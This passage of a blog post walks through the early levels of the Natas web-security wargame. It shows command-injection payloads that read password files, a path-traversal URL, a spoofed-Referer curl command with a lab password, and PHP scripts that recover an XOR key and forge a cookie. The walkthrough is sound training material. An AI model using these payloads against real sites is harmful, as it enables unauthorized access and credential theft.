<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Exploiting the Web in 20 Lessons (Natas)</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="bt3gl">

    <!-- Le styles -->
    <link rel="stylesheet" href="http://bt3gl.github.io/theme/css/bootstrap.dark.css" type="text/css" />
    <style type="text/css">
      body {
        padding-top: 60px;
        padding-bottom: 40px;
      }
      .sidebar-nav {
        padding: 9px 0;
      }
      .tag-1 {
        font-size: 13pt;
      }
      .tag-2 {
        font-size: 11pt;
      }
      .tag-2 {
        font-size: 10pt;
      }
      .tag-4 {
        font-size: 8pt;
     }
    </style>
    <link href="http://bt3gl.github.io/theme/css/bootstrap-responsive.dark.css" rel="stylesheet">
        <link href="http://bt3gl.github.io/theme/css/font-awesome.css" rel="stylesheet">

    <link href="http://bt3gl.github.io/theme/css/pygments.css" rel="stylesheet">

    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Le fav and touch icons -->
    <link rel="shortcut icon" href="http://bt3gl.github.io/theme/images/favicon.ico">
    <link rel="apple-touch-icon" href="http://bt3gl.github.io/theme/images/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="72x72" href="http://bt3gl.github.io/theme/images/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="114x114" href="http://bt3gl.github.io/theme/images/apple-touch-icon-114x114.png">

    <link href="http://bt3gl.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="High Bytes by bt3gl ATOM Feed" />

  </head>

  <body>

    <div class="navbar navbar-fixed-top">
      <div class="navbar-inner">
        <div class="container-fluid">
          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </a>
          <a class="brand" href="http://bt3gl.github.io/index.html">High Bytes by bt3gl </a>
          <div class="nav-collapse">
            <ul class="nav">
                          <li class="divider-vertical"></li>


                          <ul class="nav pull-right">
                                <li><a href="http://bt3gl.github.io/authors.html">About</a></li>
                                <li><a href="https://github.com/bt3gl">GitHub</a></li>
                                <li><a href="https://twitter.com/bt3gl">Twitter</a></li>
                                <li><a href="https://coderwall.com/p/kubxjq?i=11&p=2&q=author%3Abt3gl&t%5B%5D=bt3gl">CodeWall</a></li>
                                <li><a href="projects_page/index.html">Projects</a></li>
                                <li><a href="http://bt3gl.github.io/archives.html"><b>Archives</b></a></li>

                          </ul>

            </ul>
            <!--<p class="navbar-text pull-right">Logged in as <a href="#">username</a></p>-->
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>

    <div class="container-fluid">
      <div class="row">
        <div class="span9" id="content">
<section id="content">
        <article>
                <header>
                        <h1>
                                <a href=""
                                        rel="bookmark"
                                        title="Permalink to Exploiting the Web in 20 Lessons (Natas)">
                                        Exploiting the Web in 20 Lessons (Natas)
                                </a>
                        </h1>
                </header>
                <div class="entry-content">
                <div class="well">
<footer class="post-info">
<abbr class="published" title="2014-10-16T02:01:00">
      Thu 16 October 2014 </abbr>

<span class="label"> Category</span>
<a href="http://bt3gl.github.io/category/web-exploitation.html"><i class="icon-folder-open"></i>Web Exploitation</a>


<span class="label">Tags</span>
	<a href="http://bt3gl.github.io/tag/wargames.html"><i class="icon-tag"></i>Wargames</a>
	<a href="http://bt3gl.github.io/tag/python.html"><i class="icon-tag"></i>Python</a>
	<a href="http://bt3gl.github.io/tag/burpsuite.html"><i class="icon-tag"></i>BurpSuite</a>
	<a href="http://bt3gl.github.io/tag/request.html"><i class="icon-tag"></i>request</a>
	<a href="http://bt3gl.github.io/tag/php.html"><i class="icon-tag"></i>PHP</a>
	<a href="http://bt3gl.github.io/tag/javascript.html"><i class="icon-tag"></i>JavaScript</a>
	<a href="http://bt3gl.github.io/tag/sqli.html"><i class="icon-tag"></i>SQLi</a>
	<a href="http://bt3gl.github.io/tag/command_injection.html"><i class="icon-tag"></i>Command_Injection</a>
	<a href="http://bt3gl.github.io/tag/mysql.html"><i class="icon-tag"></i>MySQL</a>
	<a href="http://bt3gl.github.io/tag/xor.html"><i class="icon-tag"></i>XOR</a>
	<a href="http://bt3gl.github.io/tag/brute_force.html"><i class="icon-tag"></i>Brute_Force</a>
</footer><!-- /.post-info -->                </div>
                <p><img alt="" src="http://i.imgur.com/ihtJsdE.png" /></p>
<h2>Sinmple HTML Knowledge</h2>
<h3>Level 0 and 1: Simple Sourcecode Inspection</h3>
<p>Look at the source code, dissalowing JavaScript (so you can right click it).</p>
<div class="highlight"><pre><span class="o">&lt;</span><span class="n">body</span> <span class="n">oncontextmenu</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;right clicking has been blocked!&#39;);return false;&quot;</span><span class="o">&gt;</span>
</pre></div>


<h3>Level 2: Sourcecode Inspection for Directories</h3>
<p>Looking at the source code we find :</p>
<div class="highlight"><pre><span class="n">There</span> <span class="n">is</span> <span class="n">nothing</span> <span class="n">on</span> <span class="n">this</span> <span class="n">page</span>
<span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;files/pixel.png&quot;</span><span class="o">&gt;</span>
</pre></div>


<p>Well, taking a look at</p>
<div class="highlight"><pre><span class="nl">http:</span><span class="c1">//natas2.natas.labs.overthewire.org/files/</span>
</pre></div>


<p>we find: <code>users.txt</code> with the password.</p>
<h3>Level 3: Robots.txt</h3>
<p>Looking at the source code we see:</p>
<div class="highlight"><pre><span class="o">&lt;!--</span> <span class="n">No</span> <span class="n">more</span> <span class="n">information</span> <span class="n">leaks</span><span class="o">!!</span> <span class="n">Not</span> <span class="n">even</span> <span class="n">Google</span> <span class="n">will</span> <span class="n">find</span> <span class="n">it</span> <span class="n">this</span> <span class="n">time</span><span class="p">...</span> <span class="o">--&gt;</span>
</pre></div>


<p>Webmasters usually help search engines index their site with a file called ```robots.txt'''. Looking at:</p>
<div class="highlight"><pre><span class="nl">http:</span><span class="c1">//natas3.natas.labs.overthewire.org/robots.txt</span>
</pre></div>


<p>We find:</p>
<div class="highlight"><pre><span class="n">User</span><span class="o">-</span><span class="n">agent</span><span class="o">:</span> <span class="o">*</span>
<span class="nl">Disallow:</span> <span class="o">/</span><span class="n">s3cr3t</span><span class="o">/</span>
</pre></div>


<p>Now, looking at the content of  this folder:</p>
<div class="highlight"><pre><span class="n">Index</span> <span class="n">of</span> <span class="o">/</span><span class="n">s3cr3t</span>

<span class="p">[</span><span class="n">ICO</span><span class="p">]</span>   <span class="n">Name</span>    <span class="n">Last</span> <span class="n">modified</span>   <span class="n">Size</span>    <span class="n">Description</span>
<span class="p">[</span><span class="kt">DIR</span><span class="p">]</span>   <span class="n">Parent</span> <span class="n">Directory</span>        <span class="o">-</span>
<span class="p">[</span><span class="n">TXT</span><span class="p">]</span>   <span class="n">users</span><span class="p">.</span><span class="n">txt</span>   <span class="mi">12</span><span class="o">-</span><span class="n">Jul</span><span class="o">-</span><span class="mi">2013</span> <span class="mi">13</span><span class="o">:</span><span class="mi">35</span>   <span class="mi">40</span>
</pre></div>


<p>Gives us the password file:</p>
<div class="highlight"><pre><span class="nl">http:</span><span class="c1">//natas3.natas.labs.overthewire.org/s3cr3t/users.txt</span>
</pre></div>


<h4>Level 4: Changing the Referer Tag</h4>
<p>The front page shows this message:</p>
<div class="highlight"><pre><span class="nx">Access</span> <span class="nx">disallowed.</span> <span class="nx">You</span> <span class="nx">are</span> <span class="nx">visiting</span> <span class="nb">from</span> <span class="s2">&quot;http://natas4.natas.labs.overthewire.org/index.php&quot;</span> <span class="k">while</span> <span class="nx">authorized</span> <span class="nx">users</span> <span class="nx">should</span> <span class="nx">come</span> <span class="nx">only</span> <span class="nb">from</span> <span class="s2">&quot;http://natas5.natas.labs.overthewire.org/&quot;</span>
<span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="nb">div</span> <span class="n">id</span><span class="o">=</span><span class="s2">&quot;viewsource&quot;</span><span class="o">&gt;&lt;</span><span class="nx">a</span> <span class="n">href</span><span class="o">=</span><span class="s2">&quot;index.php&quot;</span><span class="o">&gt;</span><span class="nb">Refresh</span> <span class="nx">page</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;&lt;/</span><span class="nb">div</span><span class="o">&gt;</span>
</pre></div>


<p>The server thinks we are coming from a page that is indicated in the ‘Referer’ tag in the headers. There are many ways to tamper this. While we could use browser plugins such as <a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=en">tampermonkey</a> or <a href="https://chrome.google.com/webstore/detail/modify-headers-for-google/innpjfdalfhpcoinfnehdnbkglpmogdi?hl=en-US">modify-headers</a>, the good old <strong>curl</strong> will make it:</p>
<div class="highlight"><pre><span class="n">curl</span> <span class="o">--</span><span class="n">user</span> <span class="n">natas4</span><span class="o">:</span><span class="n">Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</span> <span class="n">http</span><span class="o">:</span><span class="c1">//natas4.natas.labs.overthewire.org/index.php --referer &quot;http://natas5.natas.labs.overthewire.org/&quot;</span>
</pre></div>


<h3>Level 5: Modifying values in a Cookie</h3>
<p>When we log in the page says:</p>
<div class="highlight"><pre><span class="n">Access</span> <span class="n">disallowed</span><span class="p">.</span> <span class="n">You</span> <span class="n">are</span> <span class="n">not</span> <span class="n">logged</span> <span class="n">in</span>
</pre></div>


<p>Inspecting the page source does not give any additional information. We check the elements of the page. There is a cookie named <em>loggedin</em> with value 0. What happens if we change it to 1?</p>
<p>Using the <a href="http://www.editthiscookie.com/start/">edit this cookie</a> for this taks, plugin we get the password.</p>
<h3>Level 6: Sourcecode Inspection for Directories II</h3>
<p>This level comes with PHP form:</p>
<div class="highlight"><pre><span class="cp">&lt;?</span>

<span class="cp">include &quot;includes/secret.inc&quot;;</span>

<span class="cp">    if(array_key_exists(&quot;submit&quot;, $_POST)) {</span>
<span class="cp">        if($secret == $_POST[</span><span class="s1">&#39;secret&#39;</span><span class="cp">]) {</span>
<span class="cp">        print &quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;;</span>
<span class="cp">    } else {</span>
<span class="cp">        print &quot;Wrong secret&quot;;</span>
<span class="cp">    }</span>
<span class="cp">    }</span>
<span class="cp">?&gt;</span>


<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">post</span><span class="nt">&gt;</span>
Input secret: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">secret</span><span class="nt">&gt;&lt;br&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">name=</span><span class="s">submit</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</pre></div>


<p>LOL, we can just take a look at</p>
<div class="highlight"><pre><span class="nl">http:</span><span class="c1">//natas6.natas.labs.overthewire.org/includes/secret.inc</span>
</pre></div>


<p>Adding the value in the input form, we get the secret.</p>
<h3>Level 7: Modifying URL</h3>
<p>This level has the folowing PHP code and hint:</p>
<div class="highlight"><pre><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">&quot;content&quot;</span><span class="nt">&gt;</span>

<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;index.php?page=home&quot;</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;index.php?page=about&quot;</span><span class="nt">&gt;</span>About<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;br&gt;</span>
<span class="nt">&lt;br&gt;</span>
this is the front page

<span class="c">&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</pre></div>


<p>Well, instead of <em>page=home</em> we change to <em>page=/etc/natas_webpass/natas8</em> and we get our password at * http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8*.</p>
<h3>Level 8: String Decoding</h3>
<p>This level comes with a PHP form similar to the level 6. Looking at the code source we have:</p>
<div class="highlight"><pre><span class="cp">&lt;?</span>

<span class="cp">$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;</span>

<span class="cp">function encodeSecret($secret) {</span>
<span class="cp">    return bin2hex(strrev(base64_encode($secret)));</span>
<span class="cp">}</span>

<span class="cp">if(array_key_exists(&quot;submit&quot;, $_POST)) {</span>
<span class="cp">    if(encodeSecret($_POST[</span><span class="s1">&#39;secret&#39;</span><span class="cp">]) == $encodedSecret) {</span>
<span class="cp">    print &quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;;</span>
<span class="cp">    } else {</span>
<span class="cp">    print &quot;Wrong secret&quot;;</span>
<span class="cp">    }</span>
<span class="cp">}</span>
<span class="cp">?&gt;</span>
</pre></div>


<p>We see we have to perform the following operations to recover the <em>secret</em> from the <em>encodedSecret</em>:</p>
<p>1 - Hexadecimal to binary (<em>bin2hex</em>):</p>
<div class="highlight"><pre><span class="n">SECRET</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
<span class="s">&#39;==QcCtmMml1ViV3b&#39;</span>
</pre></div>


<p>2 - Reverse the string ( <em><a href="http://php.net/manual/en/function.strrev.php">strrev</a></em>).</p>
<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">SECRET</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="s">&#39;b3ViV1lmMmtCcQ==&#39;</span>
</pre></div>


<p>3 - Base64 decode (<em>base64_encode</em>).</p>
<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">SECRET</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;base64&#39;</span><span class="p">)</span>
<span class="s">&#39;oubWYf2kBq&#39;</span>
</pre></div>


<p>Inputing that secret in the form file gives us the password.</p>
<hr />
<h2>Crafted Attacks</h2>
<h3>Level 9: OS Command Injection</h3>
<p>This level contain a search field. If we try some word, for example <em>secret</em>, we get several variations of this word:
<img alt="" src="" /></p>
<p>Inspecting the source code we see the following:</p>
<div class="highlight"><pre><span class="nt">&lt;h1&gt;</span>natas9<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">&quot;content&quot;</span><span class="nt">&gt;</span>
<span class="nt">&lt;form&gt;</span>
Find words containing: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">needle</span><span class="nt">&gt;&lt;input</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">name=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">Search</span><span class="nt">&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="nt">&lt;/form&gt;</span>
Output:
<span class="nt">&lt;pre&gt;</span>
<span class="cp">&lt;?</span>
<span class="cp">$key = &quot;&quot;;</span>

<span class="cp">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) {</span>
<span class="cp">    $key = $_REQUEST[</span><span class="s2">&quot;needle&quot;</span><span class="cp">];</span>
<span class="cp">}</span>

<span class="cp">if($key != &quot;&quot;) {</span>
<span class="cp">    passthru(&quot;grep -i $key dictionary.txt&quot;);</span>
<span class="cp">}</span>
<span class="cp">?&gt;</span>
<span class="nt">&lt;/pre&gt;</span>
</pre></div>


<p>If we try inputs such as '<em>', '""', or "\n", shows the entire list of words inside </em>dictionary.txt*. No password there.</p>
<p>Looking close to the code we see the command <strong>passthru()</strong>, which is a <a href="http://php.net/manual/en/function.passthru.php">PHP function</a> that executes an external command. The variable <em>$key</em> is not sanitized, so we can add any input to it that will add to the <em>grep</em> command.</p>
<p>This mean that we can craft an input to inject a code that will display the password at the folder <em>/etc/natas_webpass/natas10</em>. This type of attack is called <a href="https://www.owasp.org/index.php/OS_Command_Injection">OS command injection</a>.</p>
<p>In <strong>Bash</strong>, the semicolon permits putting two or more commands on the same line. Adding a <strong>;</strong> to our input allows us to add a <strong>cat</strong> after that.</p>
<p>So searching for:</p>
<div class="highlight"><pre><span class="p">;</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">natas_webpass</span><span class="o">/</span><span class="n">natas10</span>
</pre></div>


<p>Gives our password.</p>
<h3>Level 10: OS Command Injection II</h3>
<p>This level starts a search form like the previous level, but this time with the warning <em>For security reasons, we now filter on certain characters</em>.</p>
<p>Taking a look at the source code we find:</p>
<div class="highlight"><pre><span class="nt">&lt;pre&gt;</span>
<span class="cp">&lt;?</span>
<span class="cp">$key = &quot;&quot;;</span>

<span class="cp">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) {</span>
<span class="cp">    $key = $_REQUEST[</span><span class="s2">&quot;needle&quot;</span><span class="cp">];</span>
<span class="cp">}</span>

<span class="cp">if($key != &quot;&quot;) {</span>
<span class="cp">    if(preg_match(&#39;/[</span><span class="p">;</span><span class="o">|&amp;</span><span class="cp">]/&#39;,$key)) {</span>
<span class="cp">        print &quot;Input contains an illegal character!&quot;;</span>
<span class="cp">    } else {</span>
<span class="cp">        passthru(&quot;grep -i $key dictionary.txt&quot;);</span>
<span class="cp">    }</span>
<span class="cp">}</span>
<span class="cp">?&gt;</span>
<span class="nt">&lt;/pre&gt;</span>
</pre></div>


<p>So the difference here is an <em>if</em> clause with the function <a href="http://php.net/manual/en/function.preg-match.php">preg_match</a>. This function is used to search for a pattern in a string, <em>i.e.</em>, it hyginizes the string against the pattern <em>;</em>, <em>|</em>,  and <em>&amp;</em>. We cannot use the same attack as before with a semicolon!</p>
<p>We need to think about some other injection that does not need those symbols. When I was messing around in the previous level I noticed that we can use <em>""</em> as an input. So I crafted the following and it worked:</p>
<div class="highlight"><pre><span class="s">&quot;&quot;</span>  <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">natas_webpass</span><span class="o">/</span><span class="n">natas11</span>
</pre></div>


<h3>Level 11: Cookies and XOR Encryption</h3>
<p>This level starts with an input form to set a background color and a message "cookies are protected with XOR encryption":</p>
<p><img alt="" src="" /></p>
<p>let's inspect the sourcecode in steps. First, we have this suspicious array:</p>
<div class="highlight"><pre><span class="err">$</span><span class="n">defaultdata</span> <span class="o">=</span> <span class="n">array</span><span class="p">(</span> <span class="s">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s">&quot;no&quot;</span><span class="p">,</span> <span class="s">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s">&quot;#ffffff&quot;</span><span class="p">);</span>
</pre></div>


<p>We will see soon that this array is passed to a coookie as an encrypted XOR string.</p>
<p>What happens if we manage to set <em>showpassword</em> to <em>yes</em>, this is answered in the end of the code:</p>
<div class="highlight"><pre><span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="err">[</span><span class="s2">&quot;showpassword&quot;</span><span class="cp">]</span> == &quot;yes&quot;) {
    print &quot;The password for natas12 is <span class="nt">&lt;censored&gt;&lt;br&gt;</span>&quot;;
}
</pre></div>


<p>We know the way now.</p>
<p>Back to the begining, we have this XOR encryption that take an input value, <em>$text</em> and XOR to a variable <em>$key</em>. So we know that XORing the output with what we sent as input can return the content of <em>$key</em>:</p>
<div class="highlight"><pre><span class="nx">function</span> <span class="nx">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">;</span>
    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>

    <span class="c1">// Iterate through each character</span>
    <span class="nb">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$outText</span> <span class="nx">.</span><span class="o">=</span> <span class="nv">$text</span><span class="err">[</span><span class="nv">$i</span><span class="cp">]</span> ^ $key<span class="cp">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span><span class="cp">]</span>;
    }

    return $outText;
}
</pre></div>


<p>The rest of the code is only important to show that the string encoded in base64 before sent to the cookie. The function in the bottom just changes the color of the background:</p>
<div class="highlight"><pre><span class="nx">function</span> <span class="nx">loadData</span><span class="p">(</span><span class="nv">$def</span><span class="p">)</span> <span class="p">{</span>
    <span class="bp">global</span> <span class="nv">$_COOKIE</span><span class="p">;</span>
    <span class="nv">$mydata</span> <span class="o">=</span> <span class="nv">$def</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$tempdata</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="err">[</span><span class="s2">&quot;data&quot;</span><span class="cp">]</span>)), true);
    if(is_array($tempdata) <span class="err">&amp;&amp;</span> array_key_exists(&quot;showpassword&quot;, $tempdata) <span class="err">&amp;&amp;</span> array_key_exists(&quot;bgcolor&quot;, $tempdata)) {
        if (preg_match(&#39;/^#(?:<span class="cp">[</span><span class="nx">a</span><span class="na">-f</span><span class="o">\</span><span class="nb">d</span><span class="cp">]</span>{6})$/i&#39;, $tempdata<span class="cp">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="cp">]</span>)) {
        $mydata<span class="cp">[</span><span class="s1">&#39;showpassword&#39;</span><span class="cp">]</span> = $tempdata<span class="cp">[</span><span class="s1">&#39;showpassword&#39;</span><span class="cp">]</span>;
        $mydata<span class="cp">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="cp">]</span> = $tempdata<span class="cp">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="cp">]</span>;
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));
}
$data = loadData($defaultdata);

if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) {
    if (preg_match(&#39;/^#(?:<span class="cp">[</span><span class="nx">a</span><span class="na">-f</span><span class="o">\</span><span class="nb">d</span><span class="cp">]</span>{6})$/i&#39;, $_REQUEST<span class="cp">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="cp">]</span>)) {
        $data<span class="cp">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="cp">]</span> = $_REQUEST<span class="cp">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="cp">]</span>;
    }
}

saveData($data);

<span class="nt">&lt;form&gt;</span>
Background color: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">bgcolor</span> <span class="na">value=</span><span class="s">&quot;</span><span class="cp">&lt;?=</span><span class="nv">$data</span><span class="err">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="err">]</span><span class="cp">?&gt;</span><span class="s">&quot;</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">&quot;Set color&quot;</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
&#39;&#39;&#39;


Since we know the plaintext, given by the variable $defaultdata, all we need is the value in the cookie, so we can XOR and get our key. We can use the plugin I described before, *Edit this cookie*, to get this value:
</pre></div>


<p>ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw</p>
<div class="highlight"><pre><span class="nx">Now</span> <span class="nx">we</span> <span class="nx">write</span> <span class="k">this</span> <span class="nx">scrupt</span> <span class="k">in</span> <span class="nx">PHP</span><span class="p">,</span> <span class="nx">modifying</span> <span class="nx">the</span> <span class="nx">XOR</span> <span class="kd">function</span> <span class="nx">to</span> <span class="nx">take</span> <span class="nx">our</span> <span class="nx">input</span><span class="o">:</span>
<span class="err">```</span><span class="nx">php</span>
<span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">$cookie</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw&#39;</span><span class="p">);</span>

<span class="kd">function</span> <span class="nx">xor_encrypt</span><span class="p">(</span><span class="nx">$in</span><span class="p">){</span>
    <span class="nx">$text</span> <span class="o">=</span> <span class="nx">$in</span><span class="p">;</span>
    <span class="nx">$key</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nx">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;no&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">));</span>
    <span class="nx">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>

    <span class="k">for</span><span class="p">(</span><span class="nx">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nx">$text</span><span class="p">);</span><span class="nx">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">$outText</span> <span class="p">.</span><span class="o">=</span> <span class="nx">$text</span><span class="cp">[</span><span class="nv">$i</span><span class="cp">]</span> <span class="o">^</span> <span class="nx">$key</span><span class="cp">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span><span class="cp">]</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">$outText</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">print</span> <span class="nx">xor_encrypt</span><span class="p">(</span><span class="nx">$cookie</span><span class="p">);</span>
<span class="o">?&gt;</span>
</pre></div>


<p>Runing it gives the XOR key that encrypts the <em>$defaultdata</em> variable:</p>
<div class="highlight"><pre><span class="nv">$ </span>php xor.php
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
</pre></div>


<p>Now we modify the value of that variable to <em>showpassword”=&gt;”yes”</em> and XOR it with the right key in <em>$key</em>.
The script looks like:</p>
<div class="highlight"><pre><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">xor_encrypt_mod</span><span class="p">(){</span>
    <span class="nv">$text</span> <span class="o">=</span> <span class="nb">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;yes&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">));</span>
    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;qw8J&#39;</span><span class="p">;</span>
    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>

    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">print</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nx">xor_encrypt_mod</span><span class="p">());</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>


<p>Resulting in the code we need to add to the cookie. We do this through the plugin. Refreshing the page returns our password.</p>
<hr />
<h2>Scripting Attacks</h2>
<h3>Level 12: File Inclusion Attack</h3>
<p>This challenge starts with a JPG file uploader:
<img alt="" src="" /></p>
<p>We look at the sourcecode. The first function returns a random string of lenght 10:</p>
<div class="highlight"><pre><span class="cp">&lt;?</span>
<span class="k">function</span> <span class="nf">genRandomString</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$length</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
    <span class="nv">$characters</span> <span class="o">=</span> <span class="s2">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span><span class="p">;</span>
    <span class="nv">$string</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>

